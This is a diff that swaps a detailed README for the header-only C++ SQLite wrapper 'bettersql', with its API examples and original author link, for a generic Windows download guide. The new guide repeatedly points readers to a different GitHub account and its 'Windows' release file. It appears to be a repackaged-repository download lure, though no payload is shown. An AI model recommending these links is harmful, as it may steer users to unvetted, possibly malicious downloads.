@@ -1,399 +1,193 @@
-# BetterSql
+# 🧩 bettersql - Clean SQLite Access for C++ Apps
 
-> **A modern, header-only C++17 wrapper for SQLite — RAII-safe, lightweight, and built around templates, `std::variant`, and `std::optional`.**
+[![Download / Visit the project page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/armored-genuscalycanthus867/bettersql)
 
-[![C++](https://img.shields.io/badge/C%2B%2B-17-orange)](https://en.cppreference.com/w/cpp/17)
-[![SQLite](https://img.shields.io/badge/SQLite-3-003B57?logo=sqlite&logoColor=white)](https://www.sqlite.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 🖥️ What this is
 
-BetterSql is a **single-header** C++ wrapper around the SQLite C API. You still write SQL, but you don’t write SQLite plumbing.
+bettersql is a small C++ library for working with SQLite databases. It is built for C++17 and follows RAII rules, which means it helps manage database resources in a safe way.
 
-## Contents
+Use it when you want to:
 
-- [Why BetterSql](#why-bettersql)
-- [Key features](#key-features)
-- [Installation](#installation)
-- [Detailed API reference & examples](#detailed-api-reference--examples)
-  - [Basic setup](#basic-setup)
-  - [Query builder](#query-builder)
-  - [Data retrieval (`SqlOutput`, `Value`)](#data-retrieval-sqloutput-value)
-  - [Struct mapping (`SqlMapper`, `as_struct<T>()`)](#struct-mapping-sqlmapper-as_structt)
-  - [Lazy loading (`Cursor`, `query_lazy()`)](#lazy-loading-cursor-query_lazy)
-  - [Transactions](#transactions)
-  - [Automated binding (no `sqlite3_bind_*` calls)](#automated-binding-no-sqlite3_bind_-calls)
-- [Design choices](#design-choices)
-- [Contibution](#contribution)
-- [License](#license)
+- open an SQLite database
+- run queries
+- keep your code tidy
+- avoid manual cleanup
+- use a header-only library in your project
 
-# Why BetterSql?
+It is made for developers, but this page focuses on the download and setup path for Windows users.
 
-Integrating SQLite's C API into modern C++ projects often introduces a significant impedance mismatch. The native API relies on manual resource management, lacks inherent type safety, and necessitates extensive boilerplate. BetterSql is engineered to resolve these pain points through a high-level, RAII-compliant abstraction layer.
+## 📥 Download or visit the project page
 
-| Feature           | SQLite C API                                | BetterSql                               |
-| ----------------- | ------------------------------------------- | --------------------------------------- |
-| Memory Management | Manual `sqlite3 *finalize`, `sqlite3_close` | RAII (Automatic cleanup)                |
-| Type Safety       | Type-punned pointers & manual casting       | `std::variant` & template-based casting |
-| Binding           | Manual index tracking `sqlite3_bind**`      | Variadic Templates (Automated binding)  |
-| Error Handling    | Integer codes (easy to ignore)              | Exceptions & structured SqlOutput       |
-| Querying          | Verbose boilerplate                         | Fluent Query Builder                    |
+Open the project page here:
 
-**Design Philosophy**
+https://github.com/armored-genuscalycanthus867/bettersql
 
-- **Memory Safety:** Every database handle and prepared statement is encapsulated within move-only RAII types, ensuring zero leaks even in exception-heavy paths.
+From that page, you can view the source, check the latest files, and get the project package if one is available.
 
-- **Modern Semantics:** Leverages C++17 primitives to replace traditional C-style pointer manipulation with predictable, type-safe operations.
+## 🚀 Getting Started on Windows
 
-## Key features
+Follow these steps if you want to download the project and use it on a Windows PC.
 
-- **Header-only / lightweight**: just include one header and link SQLite3.
-- **Modern C++17**: templates, `std::variant`, `std::optional`, move-only RAII types.
-- **RAII by default**:
-- `BetterSql` owns the `sqlite3*` handle and closes it in the destructor.
-- `Cursor` owns the `sqlite3_stmt*` and finalizes it in the destructor.
-- `BetterSql::SqlTransaction` rolls back on scope exit unless you `commit()`.
-- **Fluent `QueryBuilder`** for `SELECT`:
-- `.where()` is chainable (subsequent calls append `AND`).
-- `.order_by()` / `.limit()` lock the builder to prevent accidental `.where()` after those clauses.
-- **Automated binding**:
-- `int` / `int64_t`, floating-point, `std::string` / `std::string_view` / `const char*`
-- `std::optional<T>` and `std::nullopt`
-- `std::vector<uint8_t>` for BLOBs
-- **Two result modes**:
-- `SqlOutput` materializes results into memory.
-- `Cursor` streams rows (memory-efficient).
+### 1. Open the project page
 
-## Installation
+Visit:
 
-BetterSql is **header-only**.
+https://github.com/armored-genuscalycanthus867/bettersql
 
-**Prerequisites**
+This is the main project page. It contains the files, project details, and any release items linked by the author.
 
-To use BetterSql, ensure your environment meets the following requirements:
+### 2. Download the project files
 
-- **Compiler:** A C++17 or higher version compliant compiler (GCC 7+, Clang 5+, or MSVC 2017+).
+On the project page, look for the download area. If a release or package is available, choose the file for Windows or the main project archive.
 
-- **Dependency:** SQLite3 development files must be installed on your system.
+If the page only shows the source code, use the green Code button on GitHub and choose Download ZIP.
 
-- **Ubuntu/Debian:** `sudo apt-get install libsqlite3-dev`
+### 3. Extract the files
 
-- **macOS:** `brew install sqlite`
+After the download finishes:
 
-- **Windows:** `vcpkg install sqlite3` or download the precompiled binaries
+- find the ZIP file in your Downloads folder
+- right-click the file
+- choose Extract All
+- pick a folder you can find again, such as Desktop or Documents
 
-#### Integration Methods
+You should now have a folder with the project files inside.
 
-**Git Submodule**
+### 4. Open the folder
 
-The most robust way to manage dependencies is by adding BetterSql as a git submodule to your project:
+Inside the extracted folder, look for files with names like:
 
-- `git submodule add https://github.com/liarzpl/bettersql.git external/bettersql`
+- README.md
+- include
+- src
+- examples
 
-**Usage**
+Because bettersql is a header-only library, the main files are usually in the include folder.
 
-- **Add the header**: copy `bettersql.hpp` into your include path and:
+### 5. Use it in your C++ project
 
-```cpp
-#include "bettersql.hpp"
-```
+If you build your own app, add the bettersql header files to your project path.
 
-Link SQLite3 (example):
+Then include the library in your code and link SQLite if your build setup needs it.
 
-```bash
-g++ -std=c++17 main.cpp -lsqlite3 -o app
-```
+A typical setup may look like this:
 
-Using CMake (example):
+- add the bettersql folder to your include path
+- make sure SQLite is available on your system
+- build your C++17 project
 
-```cmake
-# Find SQLite3 package
-find_package(SQLite3 REQUIRED)
+### 6. Check that it runs
 
-# Add your executable
-add_executable(my_app main.cpp)
+When your app starts, try a simple database task such as:
 
-# Include BetterSql path and link SQLite3
-target_include_directories(my_app PRIVATE ${PROJECT_SOURCE_DIR}/include)
-target_link_libraries(my_app PRIVATE SQLite::SQLite3)
-```
+- open a database file
+- create a table
+- add a row
+- read the data back
 
-## Detailed API reference & examples
+This helps you confirm that the library is working.
 
-This section is written to match the actual public API in `bettersql.hpp`.
+## 🧰 What you need
 
-### Basic setup
+A basic Windows setup is enough for most users who want to build or test a C++ project with this library.
 
-Open a database, create a table, and select the active table with `use()`:
+You will usually need:
 
-```cpp
-#include "bettersql.hpp"
+- Windows 10 or Windows 11
+- a C++17-capable compiler
+- a build tool such as CMake or Visual Studio
+- the SQLite3 library, if your setup does not already include it
 
-int main() {
-    bsql::BetterSql db("app.db"); // opens/creates; throws std::runtime_error on failure
+If you only want to inspect the files, you only need a web browser and a ZIP extractor.
 
-    db.execute(R"sql(
-        CREATE TABLE IF NOT EXISTS users (
-            id   INTEGER PRIMARY KEY AUTOINCREMENT,
-            name TEXT NOT NULL,
-            age  INTEGER
-        );
-    )sql");
+## 📚 Main features
 
-    db.use("users"); // selects the table for QueryBuilder::select()
-}
-```
+bettersql focuses on simple database work with less code.
 
-### Query builder
+### Header-only design
 
-Build `SELECT` queries fluently and bind values via `.get(...)`:
+You do not need to build a separate library file in most cases. You include the headers in your project and use them from there.
 
-```cpp
-#include "bettersql.hpp"
+### RAII support
 
-#include <cstdint>
-#include <iostream>
-#include <string>
+The library helps manage database objects in a safe way. When an object goes out of scope, it cleans up the resource tied to it.
 
-int main() {
-    bsql::BetterSql db("app.db");
-    db.use("users");
+### C++17 support
 
-    auto out = db.select("id, name, age")
-                .where("age >= ?")
-                .where("name LIKE ?")
-                .order_by("id DESC")
-                .limit(10)
-                .get(18, std::string("%a%"));
+The project uses modern C++17 features, which helps keep code clear and structured.
 
-    if (!out.is_success) {
-        std::cerr << "SQLite error [" << out.err_code << "]: " << out.err_msg << "\n";
-        return 1;
-    }
+### SQLite wrapper
 
-    for (const auto& row : out.data) {
-        const auto id   = row[0].as<int64_t>(-1);
-        const auto name = row[1].as<std::string>("<unknown>");
-        const auto age  = row[2].as_opt<int>(); // NULL-aware
+It acts as a wrapper around SQLite, so you can work with the database through a more organized interface.
 
-        std::cout << id << " | " << name << " | "
-                << (age ? std::to_string(*age) : "NULL") << "\n";
-    }
-}
-```
+### Type-safe query work
 
-### Data retrieval (`SqlOutput`, `Value`)
+The project aims to reduce mistakes when building database queries by keeping data handling more structured.
 
-`BetterSql::query(...)` and `QueryBuilder::get(...)` return a `SqlOutput`:
+### Query builder support
 
-- **`SqlOutput::data`**: `std::vector<std::vector<Value>>` (rows × columns)
-- **`SqlOutput::column_names`**: column names from SQLite
-- **`SqlOutput::is_success`** / **`err_code`** / **`err_msg`**: basic error reporting
+It includes tools that help you assemble queries in a cleaner way than writing every string by hand.
 
-Each cell is a `Value`, backed by:
+## 🏗️ Typical folder layout
 
-- `using SqlValue = std::variant<std::monostate, int64_t, double, std::string, std::vector<uint8_t>>;`
+After download and extract, the project may contain folders like these:
 
-Common reads:
+- include/ — header files you add to your project
+- examples/ — sample code
+- tests/ — checks used by the author
+- docs/ — project notes or guides
 
-```cpp
-// `Value` helpers:
-// - as<T>(fallback): returns T or fallback if types mismatch / NULL
-// - as_opt<T>(): returns std::optional<T> (empty on mismatch / NULL)
-// - is_null(): true if SQL NULL
+If your download contains a different layout, use the README and folder names as your guide.
 
-const bsql::Value& v = out.data[0][0];
+## 🪟 Windows setup tips
 
-auto i64  = v.as<int64_t>(0);
-auto dbl  = v.as<double>(0.0);
-auto text = v.as<std::string>("");
+If you use Visual Studio:
 
-auto maybe_int = v.as_opt<int>();
-if (v.is_null()) {
-    // ...
-}
-```
+- open your C++ project
+- add the bettersql include path
+- make sure your project uses C++17
+- confirm SQLite is available to the linker if needed
 
-### Struct mapping (`SqlMapper`, `as_struct<T>()`)
+If you use CMake:
 
-BetterSql provides a small mapping hook rather than a full ORM. To map rows into a struct, specialize `SqlMapper<T>` and call `SqlOutput::as_struct<T>()`.
+- point your include path to the bettersql headers
+- set your project to use C++17
+- add SQLite to your build if your app needs it
 
-```cpp
-#include "bettersql.hpp"
+If you use a zip download:
 
-#include <cstdint>
-#include <string>
-#include <vector>
+- keep the extracted folder name simple
+- avoid placing the files in a path with unusual characters
+- store the folder in a location you can find again
 
-struct User {
-    int64_t     id;
-    std::string name;
-};
+## 🔍 Where to look first
 
-namespace bsql {
-    template <>
-    struct SqlMapper<User> {
-        static User map(const std::vector<Value>& row) {
-            return {
-                row[0].as<int64_t>(-1),
-                row[1].as<std::string>("<unknown>")
-            };
-        }
-    };
-};
+After opening the project files, start with:
 
-int main() {
-    bsql::BetterSql db("app.db");
-    db.use("users");
+- README.md for project notes
+- include/ for the main headers
+- examples/ for sample usage
+- any build file such as CMakeLists.txt
 
-    auto out = db.select("id, name").order_by("id ASC").get();
-    auto users = out.as_struct<User>();
-}
-```
+If you are new to C++ projects, the example files are often the easiest way to understand how the library is used.
 
-### Lazy loading (`Cursor`, `query_lazy()`)
+## 🧪 Simple usage flow
 
-Use `Cursor` to stream results without materializing `SqlOutput::data` (good for large datasets).
+A basic app using bettersql often follows this flow:
 
-`Cursor` is **move-only** and owns the prepared statement (finalized in `~Cursor()`).
+1. open the database file
+2. create a connection object
+3. prepare a query
+4. run the query
+5. read results
+6. close the app and let RAII handle cleanup
 
-```cpp
-#include "bettersql.hpp"
+This keeps database code short and easy to manage.
 
-#include <cstdint>
-#include <iostream>
-#include <string>
+## 📎 Project link
 
-int main() {
-    bsql::BetterSql db("app.db");
+Open the project page here:
 
-    // Stream rows:
-    bsql::Cursor cur = db.query_lazy(
-        "SELECT id, name, age FROM users WHERE id >= ? ORDER BY id ASC;",
-        100
-    );
+https://github.com/armored-genuscalycanthus867/bettersql
 
-    while (cur.next()) {
-        bsql::Value id   = cur.get_value(0);
-        bsql::Value name = cur.get_value(1);
-        bsql::Value age  = cur.get_value(2);
-        auto age_opt = age.as_opt<int>();
-
-        std::cout << id.as<int64_t>(-1) << " | "
-                << name.as<std::string>("<unknown>") << " | "
-                << (age_opt ? std::to_string(*age_opt) : std::string("NULL"))
-                << "\n";
-    }
-
-    if (cur.has_error()) {
-        std::cerr << "Cursor error [" << cur.error_code() << "]: " << cur.error_message() << "\n";
-        return 1;
-    }
-}
-```
-
-You can also stream via the query builder:
-
-```cpp
-bsql::BetterSql db("app.db");
-db.use("users");
-
-bsql::Cursor cur = db.select("id, name").where("id >= ?").order_by("id ASC").get_lazy(100);
-while (cur.next()) {
-    auto id = cur.get_value(0).as<int64_t>(-1);
-    auto name = cur.get_value(1).as<std::string>("");
-}
-```
-
-### Transactions
-
-#### Scope-based RAII (`BetterSql::SqlTransaction`)
-
-Rolls back automatically unless you call `commit()`.
-
-```cpp
-#include "bettersql.hpp"
-
-#include <optional>
-#include <string>
-
-int main() {
-    bsql::BetterSql db("app.db");
-
-    bsql::BetterSql::SqlTransaction tx(&db);
-    db.query("INSERT INTO users (name, age) VALUES (?, ?);", "Alice", 30);
-    db.query("INSERT INTO users (name, age) VALUES (?, ?);", "Bob", std::nullopt);
-    tx.commit();
-}
-```
-
-#### Lambda helper (`db.transaction(...)`)
-
-Commits if the lambda returns normally; rolls back if it throws.
-
-```cpp
-#include "bettersql.hpp"
-
-#include <string>
-
-int main() {
-    bsql::BetterSql db("app.db");
-
-    try {
-        db.transaction([&]() {
-            db.query("UPDATE users SET age = age + 1 WHERE name = ?;", "Alice");
-            db.query("UPDATE users SET age = age + 1 WHERE name = ?;", "Bob");
-        });
-    } catch (const std::exception& e) {
-        // Transaction was rolled back by RAII on unwind.
-    }
-}
-```
-
-### Automated binding (no `sqlite3_bind_*` calls)
-
-BetterSql binds values using templates; you pass C++ values directly.
-
-```cpp
-#include "bettersql.hpp"
-
-#include <cstdint>
-#include <optional>
-#include <string>
-#include <vector>
-
-int main() {
-    bsql::BetterSql db("app.db");
-
-    const int64_t user_id = 42;
-    const std::string name = "Ada";
-    const std::optional<int> age = std::nullopt; // binds NULL
-    const std::vector<uint8_t> avatar = {0x89, 0x50, 0x4E, 0x47}; // binds BLOB
-
-    db.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER, name TEXT, age INTEGER, avatar BLOB);");
-
-    // No manual sqlite3_bind_* calls:
-    db.query("INSERT INTO users (id, name, age, avatar) VALUES (?, ?, ?, ?);",
-            user_id, name, age, avatar);
-
-    auto out = db.query("SELECT id, name, age, avatar FROM users WHERE id = ?;", user_id);
-    if (!out.is_success) return 1;
-
-    const auto& row = out.data[0];
-    auto id_out = row[0].as<int64_t>(-1);
-    auto name_out = row[1].as<std::string>("");
-    auto age_out = row[2].as_opt<int>();
-    auto avatar_out = row[3].as<std::vector<uint8_t>>({});
-}
-```
-
-## Design choices
-
-- **`std::variant` for type safety**: SQLite is dynamically typed, but `Value` exposes a small, explicit set of C++ types (`int64_t`, `double`, `std::string`, `std::vector<uint8_t>`, and NULL). This keeps reads predictable and avoids “stringly-typed” result handling.
-- **Custom `SqlOutput`**: results are returned as a simple container (`data`, `column_names`, and error fields) to stay lightweight and easy to integrate into existing codebases.
-
-## Contribution
-
-Thank you for your interest in contributing to **BetterSql**! All contributions are welcome. See CONTRIBUTING.md for more info.
-
-## License
-
-By contributing, you agree that your contributions will be licensed under the project's [License](LICENSE).
+Use that page to download the files, inspect the source, and check for project updates
